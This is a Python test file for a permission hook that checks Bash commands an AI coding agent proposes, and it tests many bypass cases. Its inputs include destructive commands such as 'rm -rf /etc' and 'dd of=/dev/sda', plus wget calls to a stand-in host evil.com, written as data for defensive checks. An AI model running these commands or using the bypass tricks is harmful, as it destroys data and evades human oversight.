#!/usr/bin/env python3
"""
Integration Tests: PreToolUse Hook

Tests the PreToolUse hook with simulated stdin payloads:
- Allowed commands return 'allow'
- Unknown/denied commands return 'ask'
- Non-Bash tools are passed through
- Compound commands are validated correctly
"""

import json
import os
import sys
import subprocess
import unittest
from pathlib import Path
from unittest.mock import patch, MagicMock

# Add paths for imports
sys.path.insert(0, str(Path(__file__).parent.parent / ".claude" / "hooks"))

# Import test fixtures
from fixtures import PRETOOL_USE_PAYLOADS

from pretool_hook import (
    BashPermissionValidator,
    BashCommandParser,
    _strip_function_def_header,
)
from settings_loader import SettingsLoader


class TestPreToolUseHook(unittest.TestCase):
    """Integration tests for PreToolUse hook."""

    def setUp(self):
        """Set up test fixtures."""
        self.workspace_dir = str(Path(__file__).parent.parent)
        self.settings_loader = SettingsLoader(self.workspace_dir)
        self.parser = BashCommandParser()
        self.validator = BashPermissionValidator(self.settings_loader, self.parser)

    def test_allowed_simple_command(self):
        """Test that simple allowed commands are approved."""
        payload = PRETOOL_USE_PAYLOADS["allowed_simple"]
        command = payload["tool_input"]["command"]

        result = self.validator.validate_bash_command(command)

        self.assertEqual(result["decision"], "allow")
        self.assertIn("All sub-commands", result["reason"])

    def test_allowed_compound_command(self):
        """Test that compound allowed commands are approved."""
        payload = PRETOOL_USE_PAYLOADS["allowed_compound"]
        command = payload["tool_input"]["command"]

        result = self.validator.validate_bash_command(command)

        self.assertEqual(result["decision"], "allow")

    def test_unknown_command_returns_ask(self):
        """Test that unknown commands return 'ask'."""
        payload = PRETOOL_USE_PAYLOADS["unknown_command"]
        command = payload["tool_input"]["command"]

        result = self.validator.validate_bash_command(command)

        self.assertEqual(result["decision"], "ask")

    def test_denied_command_returns_ask(self):
        """Test that denied commands return 'ask' (to be handled by PermissionRequest)."""
        payload = PRETOOL_USE_PAYLOADS["denied_command"]
        command = payload["tool_input"]["command"]

        result = self.validator.validate_bash_command(command)

        # Denied patterns trigger 'ask' (let PermissionRequest handle it)
        self.assertEqual(result["decision"], "ask")
        self.assertIn("denied", result["reason"].lower())

    def test_mixed_allowed_unknown_returns_ask(self):
        """Test that mixed allowed+unknown commands return 'ask'."""
        payload = PRETOOL_USE_PAYLOADS["mixed_allowed_unknown"]
        command = payload["tool_input"]["command"]

        result = self.validator.validate_bash_command(command)

        # Any unknown triggers 'ask'
        self.assertEqual(result["decision"], "ask")

    def test_absolute_path_command_normalizes_to_basename(self):
        """Path-qualified commands match the same Bash(<name>:*) allow rules."""
        # The original real-world failure: stat/echo allowed but /bin/ls was not.
        command = (
            'stat /home/user/project/tests 2>&1; echo "---"; '
            '/bin/ls -1f /home/user/project/tests 2>&1 | head -50'
        )

        result = self.validator.validate_bash_command(command)

        self.assertEqual(result["decision"], "allow")

    def test_absolute_path_respects_deny_list(self):
        """A denied command stays denied even when invoked by absolute path."""
        # 'dd' is in the deny list; /bin/dd must normalize and still match it.
        result = self.validator.validate_bash_command("/bin/dd if=/dev/zero of=/dev/sda")

        self.assertEqual(result["decision"], "ask")
        self.assertIn("denied", result["reason"].lower())

    def test_unknown_absolute_path_command_returns_ask(self):
        """A path to an unrecognized binary outside the workspace still asks."""
        result = self.validator.validate_bash_command("/usr/bin/some_unknown_tool --flag")

        self.assertEqual(result["decision"], "ask")

    def test_complex_pipeline(self):
        """Test complex pipeline with multiple commands."""
        payload = PRETOOL_USE_PAYLOADS["complex_pipeline"]
        command = payload["tool_input"]["command"]

        result = self.validator.validate_bash_command(command)

        # git, head, and grep are all allowed
        self.assertEqual(result["decision"], "allow")
        self.assertEqual(len(result["sub_commands"]), 3)

    def test_allowed_subshell_groups(self):
        """Test allowed commands wrapped in subshell grouping parentheses."""
        command = (
            '(cd apps/contributor && npx tsc --noEmit 2>&1 | head -40) '
            '&& echo "---PRESENTATION---" '
            '&& (cd apps/presentation && npx tsc --noEmit 2>&1 | head -40)'
        )

        result = self.validator.validate_bash_command(command)

        self.assertEqual(result["decision"], "allow")
        self.assertEqual(result["sub_commands"], [
            "cd apps/contributor",
            "npx tsc --noEmit",
            "head -40",
            'echo "---PRESENTATION---"',
            "cd apps/presentation",
            "npx tsc --noEmit",
            "head -40",
        ])

    def test_sub_command_parsing(self):
        """Test that compound commands are correctly split."""
        test_cases = [
            ("git status", ["git status"]),
            ("git diff | head -100", ["git diff", "head -100"]),
            ("ls -la && echo done", ["ls -la", "echo done"]),
            ("npm install || npm cache clean", ["npm install", "npm cache clean"]),
        ]

        for command, expected in test_cases:
            with self.subTest(command=command):
                result = self.validator.validate_bash_command(command)
                self.assertEqual(result["sub_commands"], expected,
                    f"Failed for command: {command}")


class TestPreToolUseHookProcess(unittest.TestCase):
    """Test PreToolUse hook as a subprocess."""

    def setUp(self):
        """Set up test fixtures."""
        self.hook_path = Path(__file__).parent.parent / ".claude" / "hooks" / "pretool_hook.py"
        self.workspace_dir = str(Path(__file__).parent.parent)

    def run_hook(self, payload):
        """Run the hook with a payload and return output."""
        return self.run_hook_with_options(payload)

    def run_hook_with_options(self, payload, *, cwd=None, include_workspace_env=True):
        """Run the hook with optional cwd/env overrides."""
        env = os.environ.copy()
        if include_workspace_env:
            env["CLAUDE_WORKSPACE_DIR"] = self.workspace_dir
        else:
            env.pop("CLAUDE_WORKSPACE_DIR", None)
        env["CLAUDE_HOOK_DEBUG"] = "0"

        result = subprocess.run(
            ["python3", str(self.hook_path)],
            input=json.dumps(payload),
            capture_output=True,
            text=True,
            env=env,
            cwd=cwd,
            timeout=10,
        )

        return result

    def test_hook_allows_known_command(self):
        """Test hook allows known command."""
        payload = PRETOOL_USE_PAYLOADS["allowed_simple"]
        result = self.run_hook(payload)

        # Exit code 0 with output means allow
        if result.stdout.strip():
            output = json.loads(result.stdout)
            self.assertEqual(output["hookSpecificOutput"]["permissionDecision"], "allow")

    def test_hook_asks_for_unknown_command(self):
        """Test hook asks for unknown command."""
        payload = PRETOOL_USE_PAYLOADS["unknown_command"]
        result = self.run_hook(payload)

        # Should output ask decision
        if result.stdout.strip():
            output = json.loads(result.stdout)
            self.assertEqual(output["hookSpecificOutput"]["permissionDecision"], "ask")

    def test_hook_passes_through_non_bash(self):
        """Test hook passes through non-Bash tools."""
        payload = PRETOOL_USE_PAYLOADS["non_bash_tool"]
        result = self.run_hook(payload)

        # Non-Bash tools should exit 0 with no output (pass through)
        self.assertEqual(result.returncode, 0)
        # No output means pass through to default behavior
        self.assertEqual(result.stdout.strip(), "")

    def test_hook_uses_payload_cwd_when_env_missing(self):
        """Test hook resolves workspace from payload cwd if env is absent."""
        payload = PRETOOL_USE_PAYLOADS["allowed_simple"].copy()
        payload["cwd"] = self.workspace_dir

        result = self.run_hook_with_options(
            payload,
            cwd="/tmp",
            include_workspace_env=False,
        )

        self.assertEqual(result.returncode, 0)
        output = json.loads(result.stdout)
        self.assertEqual(output["hookSpecificOutput"]["permissionDecision"], "allow")

    def test_hook_allows_tmp_binary_execution(self):
        """Test hook allows executing scripts located in /tmp."""
        payload = {
            "tool_name": "Bash",
            "tool_input": {"command": "/tmp/my-script.sh --flag"},
            "session_id": "test-session-tmp-bin",
            "cwd": self.workspace_dir,
        }

        result = self.run_hook(payload)

        self.assertEqual(result.returncode, 0)
        output = json.loads(result.stdout)
        self.assertEqual(output["hookSpecificOutput"]["permissionDecision"], "allow")

    def test_hook_allows_workspace_and_tmp_rm(self):
        """Test hook allows rm targets in workspace plus /tmp."""
        payload = {
            "tool_name": "Bash",
            "tool_input": {
                "command": "rm -f packages/api/src/forms/*.rej packages/api/src/testing/*.rej /tmp/api-eslint-fix.patch"
            },
            "session_id": "test-session-rm-tmp",
            "cwd": self.workspace_dir,
        }

        result = self.run_hook(payload)

        self.assertEqual(result.returncode, 0)
        output = json.loads(result.stdout)
        self.assertEqual(output["hookSpecificOutput"]["permissionDecision"], "allow")


class TestPreToolUseEdgeCases(unittest.TestCase):
    """Test edge cases in PreToolUse hook."""

    def setUp(self):
        """Set up test fixtures."""
        self.workspace_dir = str(Path(__file__).parent.parent)
        self.settings_loader = SettingsLoader(self.workspace_dir)
        self.parser = BashCommandParser()
        self.validator = BashPermissionValidator(self.settings_loader, self.parser)

    def test_empty_command(self):
        """Test handling of empty command."""
        result = self.validator.validate_bash_command("")
        self.assertEqual(result["decision"], "ask")  # Empty -> unknown

    def test_whitespace_command(self):
        """Test handling of whitespace-only command."""
        result = self.validator.validate_bash_command("   ")
        self.assertEqual(result["decision"], "ask")

    def test_command_with_quotes(self):
        """Test command with quoted strings."""
        command = 'echo "hello world"'
        result = self.validator.validate_bash_command(command)
        self.assertEqual(result["decision"], "allow")  # echo is allowed

    def test_command_with_heredoc(self):
        """Test command with heredoc (known fragility)."""
        # This tests the known heredoc parsing issue
        command = 'cat << "EOF" | python3\nprint("hello")\nEOF'
        result = self.validator.validate_bash_command(command)

        # The parser should handle this, but may have issues
        # Just verify no crash
        self.assertIn(result["decision"], ["allow", "ask"])

    def test_env_var_prefix(self):
        """Test command with environment variable prefix."""
        command = "NODE_ENV=production npm run build"
        result = self.validator.validate_bash_command(command)

        # Should strip env var and validate npm
        self.assertEqual(result["decision"], "allow")

    def test_sudo_prefix(self):
        """Test command with sudo prefix."""
        command = "sudo apt update"
        result = self.validator.validate_bash_command(command)

        # apt should be allowed if in list
        # Result depends on settings
        self.assertIn(result["decision"], ["allow", "ask"])

    def test_arithmetic_expansion_is_not_a_command(self):
        """`$((...))` evaluates a number and runs nothing, so it must not be
        validated as a command. `echo $((1+2))` should allow on `echo` alone."""
        result = self.validator.validate_bash_command("echo $((1+2))")
        self.assertEqual(result["decision"], "allow")

    def test_arithmetic_expansion_nested_parens(self):
        """Nested parens inside arithmetic must be consumed opaquely."""
        result = self.validator.validate_bash_command("echo $(( (3+4) * 2 ))")
        self.assertEqual(result["decision"], "allow")

    def test_counter_increment_loop_allowed(self):
        """The real-world regression: a test-runner loop with `pass=$((pass+1))`
        increments must not be split into bogus `pass+1` sub-commands."""
        command = (
            'pass=0\n'
            'for t in a b c; do\n'
            '  if echo "$t" | grep -q a; then pass=$((pass+1)); fi\n'
            'done\n'
            'echo "pass=$pass"'
        )
        result = self.validator.validate_bash_command(command)
        self.assertEqual(result["decision"], "allow")

    def test_arithmetic_does_not_mask_real_command_substitution(self):
        """A real `$(...)` command substitution must still be validated (and here
        rejected), even though arithmetic `$((...))` is now skipped."""
        result = self.validator.validate_bash_command("x=$(rm -rf /etc)")
        self.assertEqual(result["decision"], "ask")

    def test_command_substitution_nested_in_arithmetic_is_not_bypassed(self):
        """A `$(...)` nested INSIDE arithmetic still executes in bash, so it must
        be extracted and validated — skipping arithmetic must not become a bypass."""
        result = self.validator.validate_bash_command("echo $(( $(rm -rf /etc) + 1 ))")
        self.assertEqual(result["decision"], "ask")

    def test_backtick_nested_in_arithmetic_is_not_bypassed(self):
        """Same bypass guard for the backtick substitution form."""
        result = self.validator.validate_bash_command("echo $((`rm -rf /etc` + 1))")
        self.assertEqual(result["decision"], "ask")

    def test_allowed_command_substitution_in_arithmetic_still_allows(self):
        """A nested substitution running an *allowed* command keeps the allow."""
        result = self.validator.validate_bash_command(
            "echo $(( $(curl http://localhost/x) + 1 ))")
        self.assertEqual(result["decision"], "allow")


class TestPrefixReduction(unittest.TestCase):
    """Control-keyword / wrapper prefixes must not auto-authorize the command
    they introduce. The effective command is what gets validated."""

    def setUp(self):
        self.workspace_dir = str(Path(__file__).parent.parent)
        self.settings_loader = SettingsLoader(self.workspace_dir)
        self.parser = BashCommandParser()
        self.validator = BashPermissionValidator(self.settings_loader, self.parser)

    def test_reduce_unit(self):
        """_reduce_to_effective_command peels keywords and wrappers."""
        cases = {
            "do curl http://x": "curl http://x",
            "then echo done": "echo done",
            "if grep -q foo file": "grep -q foo file",
            "exec rm -rf /etc": "rm -rf /etc",
            "timeout 5 curl http://x": "curl http://x",
            "timeout 5s curl http://x": "curl http://x",
            "PORT=3100 pnpm start -p 3100": "pnpm start -p 3100",  # leading env assignment
            "FOO=bar BAZ=qux node app.js": "node app.js",          # multiple env assignments
            "env FOO=bar node app.js": "node app.js",
            "time timeout 5 curl http://x": "curl http://x",  # nested
            "/usr/bin/env curl http://x": "curl http://x",    # path-qualified wrapper
            "command node app.js": "node app.js",             # `command` exec form
            "command -p git status": "git status",            # exec form, -p flag
            "command -v chromium": "",                        # lookup, runs nothing
            "command -V git": "",                             # lookup (verbose)
            "command -pv chromium": "",                       # combined -p with -v
            "exec command -v node": "",                       # nested lookup
            "git status": "git status",                       # unchanged
            "do": "",                                         # bare keyword
            "env": "",                                        # bare wrapper
        }
        for cmd, expected in cases.items():
            self.assertEqual(
                self.validator._reduce_to_effective_command(cmd), expected,
                f"reduce({cmd!r})")

    def test_keyword_prefix_does_not_bypass(self):
        """`do rm -rf /etc` must NOT auto-allow just because it starts with a keyword."""
        result = self.validator.validate_bash_command("do rm -rf /etc")
        self.assertEqual(result["decision"], "ask")

    def test_exec_wrapper_does_not_bypass(self):
        """`exec rm -rf /etc` must reduce to `rm` (not whitelisted outside workspace)."""
        result = self.validator.validate_bash_command("exec rm -rf /etc")
        self.assertEqual(result["decision"], "ask")

    def test_xargs_wrapper_does_not_bypass(self):
        result = self.validator.validate_bash_command("find / | xargs rm -rf")
        self.assertEqual(result["decision"], "ask")

    def test_keyword_prefix_allows_real_allowed_command(self):
        """`do curl ...` reduces to an allowed `curl`."""
        result = self.validator.validate_bash_command("do curl http://localhost/x")
        self.assertEqual(result["decision"], "allow")

    def test_timeout_wrapper_allows_real_allowed_command(self):
        result = self.validator.validate_bash_command("timeout 5 curl http://localhost/x")
        self.assertEqual(result["decision"], "allow")

    def test_command_lookup_is_auto_allowed(self):
        """`command -v X` is a lookup (like which/type), not an execution of X,
        so it must auto-allow even when X is not whitelisted."""
        result = self.validator.validate_bash_command("command -v chromium chromium-browser google-chrome")
        self.assertEqual(result["decision"], "allow")

    def test_command_exec_form_validates_operand(self):
        """`command rm -rf /etc` is an execution and must NOT bypass — it reduces
        to `rm` (not whitelisted outside the workspace)."""
        result = self.validator.validate_bash_command("command rm -rf /etc")
        self.assertEqual(result["decision"], "ask")

    def test_command_exec_form_allows_real_allowed_command(self):
        """`command node app.js` reduces to an allowed `node`."""
        result = self.validator.validate_bash_command("command node app.js")
        self.assertEqual(result["decision"], "allow")

    def test_command_lookup_probe_pipeline_allowed(self):
        """The original chromium-probe one-liner is fully auto-allowed."""
        command = (
            '(command -v chromium chromium-browser google-chrome 2>/dev/null; '
            'ls node_modules/.bin/playwright 2>/dev/null; echo "---try---"; '
            'node -e "require(\'playwright\')" 2>&1 | tail -3)'
        )
        result = self.validator.validate_bash_command(command)
        self.assertEqual(result["decision"], "allow")

    def test_env_prefix_allows_real_allowed_command(self):
        """`PORT=3100 pnpm start` reduces past the env assignment to an allowed `pnpm`."""
        result = self.validator.validate_bash_command("PORT=3100 pnpm start -p 3100")
        self.assertEqual(result["decision"], "allow")

    def test_env_prefix_does_not_bypass(self):
        """A leading env assignment must not auto-allow a non-whitelisted command:
        `FOO=bar rm -rf /etc` reduces to `rm` (not whitelisted outside workspace)."""
        result = self.validator.validate_bash_command("FOO=bar rm -rf /etc")
        self.assertEqual(result["decision"], "ask")

    def test_env_prefixed_backgrounded_server_loop_allowed(self):
        """The original hyppie-flow command with a `PORT=` env prefix is auto-allowed."""
        command = (
            'cd /tmp; (PORT=3100 pnpm start -p 3100 >/tmp/next.log 2>&1 &) ; '
            'sleep 1; echo started'
        )
        result = self.validator.validate_bash_command(command)
        self.assertEqual(result["decision"], "allow")

    def test_real_loop_still_allowed(self):
        """The original hyppie-flow-style loop is fully auto-allowed."""
        command = (
            'cd /tmp; (pnpm start -p 3137 >/tmp/x.log 2>&1 &) ; sleep 1; '
            'for i in $(seq 1 20); do curl -s -o /dev/null http://localhost:3137/x '
            '2>/dev/null && break; sleep 1; done; echo " (ready)"'
        )
        result = self.validator.validate_bash_command(command)
        self.assertEqual(result["decision"], "allow")


class TestScaffoldingAndFunctions(unittest.TestCase):
    """`for`/`select` loop headers, block terminators, and function definitions
    are scaffolding that runs nothing on its own. They reduce to no-ops, while
    the loop body / function body is still validated as separate sub-commands."""

    def setUp(self):
        self.workspace_dir = str(Path(__file__).parent.parent)
        self.settings_loader = SettingsLoader(self.workspace_dir)
        self.parser = BashCommandParser()
        self.validator = BashPermissionValidator(self.settings_loader, self.parser)

    def test_reduce_unit(self):
        """_reduce_to_effective_command treats scaffolding/func-defs as no-ops and
        peels inline function-def headers down to the body command."""
        cases = {
            "for i in 4 5": "",            # loop header (word-list, not a command)
            "select opt in a b": "",       # select header
            "done": "",                    # block terminators
            "fi": "",
            "esac": "",
            "parse() {": "",               # function-def header, no inline body
            "parse ()": "",                # space before parens
            "function foo {": "",          # bash `function` form
            "function foo() {": "",        # bash `function` form with parens
            "greet() { echo hi": "echo hi",  # inline body peeled and validated
            "f() { rm -rf /etc": "rm -rf /etc",
            "git status": "git status",    # unchanged
        }
        for cmd, expected in cases.items():
            self.assertEqual(
                self.validator._reduce_to_effective_command(cmd), expected,
                f"reduce({cmd!r})")

    def test_for_loop_over_literals_allowed(self):
        result = self.validator.validate_bash_command(
            "for f in a b c; do echo $f; done")
        self.assertEqual(result["decision"], "allow")

    def test_for_loop_with_command_subst_in_list_still_validated(self):
        """A command substitution in the loop's word-list is extracted as its own
        sub-command and validated — dropping the `for` header must not hide it."""
        result = self.validator.validate_bash_command(
            "for f in $(rm -rf /etc); do echo $f; done")
        self.assertEqual(result["decision"], "ask")

    def test_function_def_header_is_noop_and_body_validated(self):
        """Multi-line function def: header is a no-op, body validated separately."""
        result = self.validator.validate_bash_command(
            'parse() {\n  awk "x" "$1"\n}\necho done')
        self.assertEqual(result["decision"], "allow")

    def test_inline_function_body_is_validated(self):
        """Inline `f() { cmd; }` glues the header to the first body command; the
        header is peeled and the body command validated on its own merits."""
        ok = self.validator.validate_bash_command('greet() { echo hi; }; greet')
        self.assertEqual(ok["decision"], "allow")
        bad = self.validator.validate_bash_command('f() { wget evil.com; }; f')
        self.assertEqual(bad["decision"], "ask")  # wget not allowlisted

    def test_call_to_local_function_is_noop(self):
        """An unquoted call to a function defined in the same command resolves to
        a no-op (its body is validated separately), not an unknown command."""
        result = self.validator.validate_bash_command(
            'greet() { echo hi; }; out=$(greet); echo $out')
        self.assertEqual(result["decision"], "allow")

    def test_function_shadowing_a_binary_runs_the_function(self):
        """`rm() { :; }; rm -rf /` invokes the no-op function, not the rm binary.
        The definition precedes the call, so the call resolves to the function."""
        result = self.validator.validate_bash_command('rm() { true; }; rm -rf /')
        self.assertEqual(result["decision"], "allow")

    def test_function_defined_after_call_does_not_shadow_it(self):
        """A function defined AFTER a same-named command does not shadow it: at
        runtime the real binary runs before the function is ever defined, so the
        command must be validated for real, not auto-allowed as a no-op. Collecting
        function names without regard to source order would silently auto-allow the
        real `rm -rf /`."""
        result = self.validator.validate_bash_command('rm -rf /; rm() { echo done; }')
        self.assertEqual(result["decision"], "ask")

    def test_command_subst_call_before_later_definition_not_shadowed(self):
        """A call inside a command substitution executes when its statement runs.
        A function defined in a LATER statement is not yet in effect, so the
        substitution's real command must still be validated — the substitution
        anchors at its own source offset, before the later definition."""
        result = self.validator.validate_bash_command(
            '$(rm -rf /); rm() { echo done; }')
        self.assertEqual(result["decision"], "ask")

    def test_parse_with_offsets_anchors_calls_before_later_defs(self):
        """parse_with_offsets pairs each sub-command with its source offset; a
        definition only shadows calls at a strictly larger offset."""
        parsed = dict(self.parser.parse_with_offsets('rm -rf /; rm() { echo done; }'))
        self.assertEqual(parsed["rm -rf /"], 0)              # call at the very start
        self.assertGreater(parsed["rm() { echo done"], 0)   # def comes later

    def test_function_def_does_not_bypass_dangerous_body(self):
        """Defining a function does not auto-approve a dangerous body command."""
        result = self.validator.validate_bash_command(
            'cleanup() {\n  wget http://evil.com/x\n}\ncleanup')
        self.assertEqual(result["decision"], "ask")

    def test_brace_and_paren_are_not_function_defs(self):
        """Brace expansion and subshells must not be mistaken for function defs."""
        # Neither reduces to '' (which is what a function-def header would do).
        self.assertEqual(self.validator._reduce_to_effective_command("echo {a,b}"),
                         "echo {a,b}")
        self.assertIsNone(_strip_function_def_header("echo {a,b}")[0])
        self.assertIsNone(_strip_function_def_header("(cd app && npm test)")[0])

    def test_original_visual_baseline_loop_allowed(self):
        """The real-world command from the bug report (function def + for loop +
        pnpm + awk + echo) is fully auto-approved."""
        command = (
            'parse() {\n'
            '  awk \'\n'
            '    /tabbar\\.spec/ {cur="tabbar"}\n'
            '    END{printf "tabbar=%s\\n",tab}\n'
            '  \' "$1"\n'
            '}\n'
            'for i in 4 5; do\n'
            '  pnpm visual:baselines >/dev/null 2>&1\n'
            '  pnpm exec playwright test --config tests/visual/playwright.config.ts > /tmp/jit_$i.txt 2>&1\n'
            '  echo "RUN $i: $(parse /tmp/jit_$i.txt)"\n'
            'done'
        )
        result = self.validator.validate_bash_command(command)
        self.assertEqual(result["decision"], "allow")


class TestNoopBuiltins(unittest.TestCase):
    """`:`, `true`, `false`, `exit`, and `return` run nothing dangerous, so they
    reduce to no-ops and never block auto-approval of an otherwise-allowed chain."""

    def setUp(self):
        self.workspace_dir = str(Path(__file__).parent.parent)
        self.settings_loader = SettingsLoader(self.workspace_dir)
        self.parser = BashCommandParser()
        self.validator = BashPermissionValidator(self.settings_loader, self.parser)

    def test_reduce_unit(self):
        cases = {
            ":": "",
            "true": "",
            "false": "",
            "exit": "",
            "exit 1": "",
            "return": "",
            "return 2": "",
        }
        for cmd, expected in cases.items():
            self.assertEqual(
                self.validator._reduce_to_effective_command(cmd), expected,
                f"reduce({cmd!r})")

    def test_truncate_and_exit_chain_allowed(self):
        """The real-world diagnostic chain: `: > log` to truncate plus `exit 1`
        bailouts no longer force a prompt."""
        result = self.validator.validate_bash_command(
            ': > "$LOG"; echo hi || { echo fail; exit 1; }')
        self.assertEqual(result["decision"], "allow")

    def test_noop_does_not_authorize_following_command(self):
        """A no-op builtin reduces only itself; a non-allowlisted neighbour still
        forces a prompt."""
        result = self.validator.validate_bash_command('exit 1; wget http://evil.com/x')
        self.assertEqual(result["decision"], "ask")


class TestAskReasonNamesUnknownCommands(unittest.TestCase):
    """The prompt shown to the user names the specific non-allowlisted
    sub-commands instead of a generic 'unknown or empty' string."""

    def setUp(self):
        self.workspace_dir = str(Path(__file__).parent.parent)
        self.settings_loader = SettingsLoader(self.workspace_dir)
        self.parser = BashCommandParser()
        self.validator = BashPermissionValidator(self.settings_loader, self.parser)

    def test_reason_lists_unknown_subcommands(self):
        result = self.validator.validate_bash_command('echo hi; frobnicate --all')
        self.assertEqual(result["decision"], "ask")
        self.assertIn("Not in allowlist", result["reason"])
        self.assertIn("`frobnicate --all`", result["reason"])
        # Allowlisted neighbours are not named as things to review.
        self.assertNotIn("echo hi", result["reason"])

    def test_reason_dedupes_and_truncates(self):
        unknowns = "; ".join(f"frob{i}" for i in range(10))
        result = self.validator.validate_bash_command(unknowns)
        self.assertEqual(result["decision"], "ask")
        self.assertIn("more)", result["reason"])  # overflow tail present


class _FakeLoader:
    """Settings loader stub with an explicit allow/deny list, so constant-
    substitution behaviour is tested independent of the project's own config."""

    def __init__(self, allow, deny=None):
        self._allow = allow
        self._deny = deny or []

    def load_all_settings(self):
        return {"permissions": {"allow": self._allow, "deny": self._deny}}


class TestConstantVariableExpansion(unittest.TestCase):
    """A constant-like assignment (`GODOT=/usr/local/bin/godot`) used later as
    `$GODOT ...` is resolved to its literal so the real command is validated."""

    def _validator(self, allow, deny=None):
        return BashPermissionValidator(
            _FakeLoader(allow, deny), BashCommandParser(), workspace_dir="/tmp"
        )

    def test_constant_binary_path_is_resolved_and_allowed(self):
        v = self._validator(["Bash(godot:*)", "Bash(echo:*)"])
        cmd = "GODOT=/usr/local/bin/godot\n$GODOT --headless --quit"
        result = v.validate_bash_command(cmd)
        self.assertEqual(result["decision"], "allow")

    def test_resolution_inside_command_substitution(self):
        v = self._validator(["Bash(godot:*)"])
        cmd = "GODOT=/usr/local/bin/godot\nout=$($GODOT --headless --script t.gd)"
        result = v.validate_bash_command(cmd)
        # The inner $GODOT (extracted from $()) resolves and matches godot.
        godot_cmd = next(r for r in result["validation_results"]
                         if r["command"].startswith("/usr/local/bin/godot"))
        self.assertTrue(godot_cmd["allowed"])

    def test_substitution_cannot_bypass_allowlist(self):
        # X bound to an unrelated command must NOT inherit godot's allowance;
        # it expands to its real form and is validated on its own merits.
        v = self._validator(["Bash(godot:*)"])
        result = v.validate_bash_command("X=rm\n$X -rf /etc/passwd")
        rm = next(r for r in result["validation_results"]
                  if r["command"].startswith("rm "))
        self.assertFalse(rm["allowed"])
        self.assertEqual(result["decision"], "ask")

    def test_dynamic_value_is_not_substituted(self):
        # A command-substitution value is not a constant, so $X is left intact
        # (unknown) rather than guessed.
        v = self._validator(["Bash(godot:*)"])
        result = v.validate_bash_command("X=$(which godot)\n$X run")
        self.assertEqual(result["decision"], "ask")
        self.assertTrue(any(r["command"].startswith("$X") for r in
                            result["validation_results"]))

    def test_use_before_assignment_is_not_resolved(self):
        # bash binds in source order: a use preceding the assignment sees no value.
        v = self._validator(["Bash(godot:*)"])
        result = v.validate_bash_command("$GODOT --headless\nGODOT=/usr/local/bin/godot")
        self.assertEqual(result["decision"], "ask")

    def test_dynamic_reassignment_poisons_earlier_constant(self):
        # Re-binding to a dynamic value must invalidate the earlier constant,
        # so $GODOT is not validated against the stale safe path.
        v = self._validator(["Bash(godot:*)"])
        cmd = "GODOT=/usr/local/bin/godot\nGODOT=$(echo rm)\n$GODOT -rf /"
        result = v.validate_bash_command(cmd)
        self.assertEqual(result["decision"], "ask")
        self.assertTrue(any(r["command"].startswith("$GODOT") for r in
                            result["validation_results"]))

    def test_env_prefix_does_not_persist(self):
        # `KEY=VALUE cmd` applies to that command only; it must not seed a
        # persistent constant for a later $KEY use.
        v = self._validator(["Bash(godot:*)", "Bash(echo:*)"])
        result = v.validate_bash_command("GODOT=/usr/local/bin/godot echo hi\n$GODOT --quit")
        self.assertEqual(result["decision"], "ask")


if __name__ == "__main__":
    unittest.main(verbosity=2)
